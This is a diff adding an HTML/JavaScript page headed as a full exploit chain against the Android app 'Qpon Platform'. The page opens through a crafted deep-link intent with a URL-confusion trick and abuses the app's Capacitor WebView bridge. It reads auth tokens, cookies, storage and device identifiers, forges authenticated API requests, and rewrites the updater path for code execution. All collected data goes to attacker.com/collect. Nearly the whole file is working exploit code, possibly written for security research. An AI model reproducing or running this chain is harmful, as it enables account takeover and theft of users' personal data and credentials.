@@ -1,0 +1,399 @@
+<!--
+  Qpon Platform (com.qpon.platform) — Full Exploit Chain
+  
+  Trigger: adb shell am start -a android.intent.action.VIEW \
+    -d "qpon://evil" -c android.intent.category.BROWSABLE \
+    --es "url" "https://www.facebook.com@attacker.com/exploit.html" \
+    --es "google.message_id" "fake" com.qpon.platform/.RouteActivity
+
+  This page loads inside the Capacitor WebView with the `androidBridge`
+  JS interface, giving full access to all Capacitor plugins.
+-->
+<html>
+<head><title>Loading...</title></head>
+<body>
+<h2 id="status">Exploit running...</h2>
+<pre id="output"></pre>
+<script>
+
+// ============================================================
+//  CORE: Capacitor Bridge Call Helper
+//  The `androidBridge` JS interface accepts JSON with:
+//    type, pluginId, methodName, callbackId, options
+// ============================================================
+let callId = 0;
+const pendingCalls = {};
+
+function capCall(pluginId, methodName, options = {}) {
+  return new Promise((resolve, reject) => {
+    const cbId = 'exploit_' + (++callId);
+    pendingCalls[cbId] = { resolve, reject };
+
+    const msg = JSON.stringify({
+      type: 'message',
+      pluginId: pluginId,
+      methodName: methodName,
+      callbackId: cbId,
+      options: options
+    });
+
+    try {
+      // The Capacitor bridge JS interface
+      window.androidBridge.postMessage(msg);
+    } catch(e) {
+      log('Bridge call failed: ' + e);
+      reject(e);
+    }
+
+    // Timeout
+    setTimeout(() => {
+      if (pendingCalls[cbId]) {
+        delete pendingCalls[cbId];
+        resolve({timeout: true});
+      }
+    }, 5000);
+  });
+}
+
+// Intercept Capacitor responses
+if (window.Capacitor && window.Capacitor.fromNative) {
+  const origFromNative = window.Capacitor.fromNative;
+  window.Capacitor.fromNative = function(result) {
+    if (result && result.callbackId && pendingCalls[result.callbackId]) {
+      const cb = pendingCalls[result.callbackId];
+      delete pendingCalls[result.callbackId];
+      if (result.success) cb.resolve(result.data || {});
+      else cb.reject(result.error || 'error');
+    }
+    if (origFromNative) origFromNative(result);
+  };
+}
+
+function log(msg) {
+  console.log(msg);
+  const el = document.getElementById('output');
+  el.textContent += msg + '\n';
+}
+
+// ============================================================
+//  EXPLOIT 1: ACCOUNT TAKEOVER — Steal all stored tokens/data
+//  Plugin: "Preferences" → read CapacitorStorage (auth tokens)
+//  Plugin: "Storage" → read app storage namespaces
+// ============================================================
+async function stealPreferences() {
+  log('[*] === STEALING PREFERENCES (Auth Tokens) ===');
+  
+  // Get all preference keys
+  const keysResult = await capCall('Preferences', 'keys', {});
+  log('[+] Preference keys: ' + JSON.stringify(keysResult));
+
+  // Common auth token keys
+  const interestingKeys = [
+    'token', 'access_token', 'refresh_token', 'auth_token',
+    'session', 'user', 'userInfo', 'userId', 'login',
+    'jwt', 'bearer', 'cookie', 'credentials', 'password',
+    'api_key', 'secret', 'phone', 'email', 'account'
+  ];
+
+  // Read all keys
+  if (keysResult && keysResult.keys) {
+    for (const key of keysResult.keys) {
+      const val = await capCall('Preferences', 'get', { key: key });
+      log('[+] Pref[' + key + '] = ' + JSON.stringify(val));
+    }
+  }
+
+  // Also try common keys directly
+  for (const key of interestingKeys) {
+    try {
+      const val = await capCall('Preferences', 'get', { key: key });
+      if (val && val.value && val.value !== 'null') {
+        log('[!] FOUND TOKEN: ' + key + ' = ' + JSON.stringify(val));
+      }
+    } catch(e) {}
+  }
+}
+
+// ============================================================
+//  EXPLOIT 2: STEAL STORAGE — App's custom storage namespaces
+//  Plugin: "Storage" → get(namespace, key)
+// ============================================================
+async function stealStorage() {
+  log('[*] === STEALING APP STORAGE ===');
+  
+  const namespaces = [
+    'qpon', 'user', 'auth', 'token', 'session', 
+    'login', 'config', 'app', 'cache'
+  ];
+  
+  const keys = [
+    'token', 'access_token', 'refresh_token', 'user',
+    'userInfo', 'session', 'login', 'phone', 'email',
+    'userId', 'auth', 'jwt', 'cookie', 'password'
+  ];
+
+  for (const ns of namespaces) {
+    for (const key of keys) {
+      try {
+        const val = await capCall('Storage', 'get', { 
+          namespace: ns, 
+          key: key 
+        });
+        if (val && val.data && val.data !== '' && val.data !== 'null') {
+          log('[!] FOUND: Storage[' + ns + '][' + key + '] = ' + val.data);
+        }
+      } catch(e) {}
+    }
+  }
+}
+
+// ============================================================
+//  EXPLOIT 3: STEAL DEVICE INFO — PII + device fingerprint
+//  Plugin: "Device" → getDeviceInfo, getStdID, getNTESCSToken
+// ============================================================
+async function stealDeviceInfo() {
+  log('[*] === STEALING DEVICE INFO + IDs ===');
+  
+  const deviceInfo = await capCall('Device', 'getDeviceInfo', {});
+  log('[+] Device Info: ' + JSON.stringify(deviceInfo));
+  // Contains: deviceId, adId, brand, model, dfp token, stdId (GUID/OUID/APID/DUID)
+
+  try {
+    const stdId = await capCall('Device', 'getCacheStdID', {});
+    log('[+] StdID (cached): ' + JSON.stringify(stdId));
+  } catch(e) {}
+  
+  try {
+    const dfpToken = await capCall('Device', 'getNTESCSToken', {});
+    log('[+] DFP Token: ' + JSON.stringify(dfpToken));
+  } catch(e) {}
+}
+
+// ============================================================
+//  EXPLOIT 4: STEAL COOKIES — Session cookies for all domains
+//  Plugin: "CapacitorCookies" → getCookies
+// ============================================================
+async function stealCookies() {
+  log('[*] === STEALING SESSION COOKIES ===');
+  
+  // Get cookies from the WebView
+  const cookies = await capCall('CapacitorCookies', 'getCookies', {});
+  log('[+] Cookies: ' + JSON.stringify(cookies));
+  
+  // Also try document.cookie
+  log('[+] document.cookie: ' + document.cookie);
+}
+
+// ============================================================
+//  EXPLOIT 5: SSRF / BACKEND REQUEST FORGERY  
+//  Plugin: "CapacitorHttp" → make authenticated requests
+//  Uses the app's cookie jar / session to hit internal APIs
+// ============================================================
+async function ssrfAttack() {
+  log('[*] === SSRF — AUTHENTICATED API REQUESTS ===');
+  
+  // Hit the app's own API with the user's session
+  const targets = [
+    'https://qpon-food-gl.qponmobile.com/digital-food/config/batch_query_config',
+    'https://qpon-food-gl.qponmobile.com/digital-food/upgrade/self_upgrade_package',
+    'https://qpon.id/api/user/profile',
+    'https://qpon.id/api/user/wallet',
+    'https://qpon.id/api/user/payment-methods'
+  ];
+
+  for (const url of targets) {
+    try {
+      const resp = await capCall('CapacitorHttp', 'get', { 
+        url: url,
+        headers: { 'Content-Type': 'application/json' }
+      });
+      log('[+] SSRF ' + url + ': ' + JSON.stringify(resp).substring(0, 500));
+    } catch(e) {
+      log('[-] SSRF ' + url + ' failed: ' + e);
+    }
+  }
+}
+
+// ============================================================
+//  EXPLOIT 6: ARBITRARY ACTIVITY LAUNCH
+//  Plugin: "AppInfo" → navigationToActivity(className, extras)
+//  Can launch ANY activity in the app with controlled extras
+// ============================================================
+async function launchArbitraryActivity() {
+  log('[*] === ARBITRARY ACTIVITY LAUNCH ===');
+  
+  // Launch MultiWebViewActivity to open another attacker URL
+  // in a WebView with full AdjustBridge JS interface
+  try {
+    await capCall('AppInfo', 'navigationToActivity', {
+      className: 'com.qpon.platform.MultiWebViewActivity',
+      isFromApp: true,
+      url: 'https://attacker.com/stage2_adjustbridge.html'
+    });
+    log('[+] Launched MultiWebViewActivity with attacker URL');
+  } catch(e) {
+    log('[-] Activity launch: ' + e);
+  }
+}
+
+// ============================================================
+//  EXPLOIT 7: WRITE TO APP STORAGE — Persistence / Manipulation
+//  Plugin: "Preferences" → set(key, value)
+//  Plugin: "Storage" → set(namespace, key, value)
+//  Can overwrite auth tokens, user settings, app config
+// ============================================================
+async function manipulateStorage() {
+  log('[*] === STORAGE MANIPULATION ===');
+  
+  // Example: overwrite the Capacitor update URL to point to attacker
+  // This would allow RCE via malicious update package
+  try {
+    await capCall('Preferences', 'set', {
+      key: 'serverBasePath',
+      value: '/data/data/com.qpon.platform/files/attacker_bundle'
+    });
+    log('[+] Overwrote serverBasePath in Preferences');
+  } catch(e) {}
+
+  // Overwrite customId for update tracking
+  try {
+    await capCall('CapacitorUpdater', 'setCustomId', {
+      customId: 'attacker_controlled_id'
+    });
+    log('[+] Set custom updater ID');
+  } catch(e) {}
+}
+
+// ============================================================
+//  EXPLOIT 8: EXFILTRATE — Send all stolen data to attacker
+// ============================================================
+async function exfiltrate(data) {
+  try {
+    // Use CapacitorHttp to bypass CORS and exfiltrate
+    await capCall('CapacitorHttp', 'post', {
+      url: 'https://attacker.com/collect',
+      headers: { 'Content-Type': 'application/json' },
+      data: data
+    });
+    log('[+] Data exfiltrated via CapacitorHttp');
+  } catch(e) {
+    // Fallback: use image beacon
+    new Image().src = 'https://attacker.com/collect?d=' + 
+      encodeURIComponent(JSON.stringify(data));
+  }
+}
+
+// ============================================================
+//  EXPLOIT 9: localStorage/sessionStorage token theft
+//  Tokens are injected via evaluateJavascript by the app
+// ============================================================
+async function stealWebStorage() {
+  log('[*] === STEALING WEB STORAGE TOKENS ===');
+  
+  // The app injects these via evaluateJavascript:
+  // sessionStorage.setItem('dfp', token)
+  // localStorage.setItem('stdId', json)
+  // sessionStorage.setItem('qpon_start_time', timestamp)
+  
+  try {
+    const dfp = sessionStorage.getItem('dfp');
+    if (dfp) log('[!] DFP Token from sessionStorage: ' + dfp);
+    
+    const stdId = localStorage.getItem('stdId');
+    if (stdId) log('[!] StdID from localStorage: ' + stdId);
+    
+    // Enumerate all keys
+    log('[+] localStorage keys:');
+    for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i);
+      log('  ' + key + ' = ' + localStorage.getItem(key));
+    }
+    
+    log('[+] sessionStorage keys:');
+    for (let i = 0; i < sessionStorage.length; i++) {
+      const key = sessionStorage.key(i);
+      log('  ' + key + ' = ' + sessionStorage.getItem(key));
+    }
+  } catch(e) {
+    log('[-] Web storage error: ' + e);
+  }
+}
+
+// ============================================================
+//  EXPLOIT 10: AdjustBridge abuse (if on MultiWebViewActivity)
+//  JS interface: window.AdjustBridge
+// ============================================================
+async function abuseAdjustBridge() {
+  log('[*] === ADJUSTBRIDGE ABUSE ===');
+  
+  if (typeof window.AdjustBridge !== 'undefined') {
+    try {
+      // Extract advertising IDs
+      window.AdjustBridge.getAdid('handleAdid');
+      window.AdjustBridge.getGoogleAdId('handleGoogleAdId');
+      window.AdjustBridge.getAttribution('handleAttribution');
+      log('[+] AdjustBridge calls dispatched');
+    } catch(e) {
+      log('[-] AdjustBridge: ' + e);
+    }
+  } else {
+    log('[-] AdjustBridge not available on this WebView');
+  }
+}
+
+// Callbacks for AdjustBridge
+window.handleAdid = function(adid) { log('[!] ADID: ' + adid); };
+window.handleGoogleAdId = function(gaid) { log('[!] Google Ad ID: ' + gaid); };
+window.handleAttribution = function(attr) { log('[!] Attribution: ' + attr); };
+
+// ============================================================
+//  MAIN: Run all exploits sequentially
+// ============================================================
+async function main() {
+  log('=== Qpon Platform Exploit Chain ===');
+  log('WebView URL: ' + window.location.href);
+  log('androidBridge available: ' + (typeof window.androidBridge !== 'undefined'));
+  log('');
+
+  const stolen = {};
+
+  try {
+    // Phase 1: Token/Data Theft (ATO)
+    await stealPreferences();
+    await stealStorage();
+    await stealCookies();
+    await stealWebStorage();
+    await stealDeviceInfo();
+    
+    // Phase 2: SSRF / Backend abuse
+    await ssrfAttack();
+    
+    // Phase 3: AdjustBridge
+    await abuseAdjustBridge();
+    
+    // Phase 4: Storage manipulation
+    await manipulateStorage();
+    
+    // Phase 5: Exfiltrate everything
+    stolen.output = document.getElementById('output').textContent;
+    await exfiltrate(stolen);
+    
+    // Phase 6: Launch stage-2 in MultiWebViewActivity
+    // (gives AdjustBridge + fresh Capacitor bridge)
+    // await launchArbitraryActivity();
+    
+    log('');
+    log('=== EXPLOIT COMPLETE ===');
+    document.getElementById('status').textContent = 'Done';
+    
+  } catch(e) {
+    log('Main error: ' + e);
+  }
+}
+
+// Wait for bridge to be ready, then run
+setTimeout(main, 1500);
+
+</script>
+</body>
+</html>
